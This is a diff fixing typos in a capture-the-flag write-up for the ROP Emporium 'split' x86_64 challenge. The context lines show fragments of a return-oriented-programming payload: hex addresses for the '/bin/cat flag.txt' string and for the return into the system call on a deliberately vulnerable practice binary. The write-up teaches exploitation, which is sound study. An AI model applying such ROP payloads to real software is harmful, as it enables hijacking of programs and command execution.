@@ -1,7 +1,7 @@
 ### split x86_64
 The problem guides has told you that same as ret2win, there is a 0x20 buffer, which can be overflowed, and there is still a syscall in a function named usefulFunction.
 
-First, check the binarat security.
+First, check the binary security.
 ```
 gdb-peda$ checksec
 CANARY    : disabled
@@ -63,7 +63,7 @@ Then, we need to push the "/bin/cat flag.txt" address into stack, which will be 
 ```
 '\x60\x10\x60\x00\x00\x00\x00\x00' //the value we want to pop into edi register. In this case is the address of string "/bin/cat flag.txt".
 ```
-Now, we successfully assign the command we want into the edu register, we can return to the syscall place to executer syscall.
+Now, we successfully assign the command we want into the edu register, we can return to the syscall place to execute syscall.
 ```
 '\x4b\x07\x40\x00\x00\x00\x00\x00' //return address jump to the syscall. It will execute the command we assign to rdi.
 ```
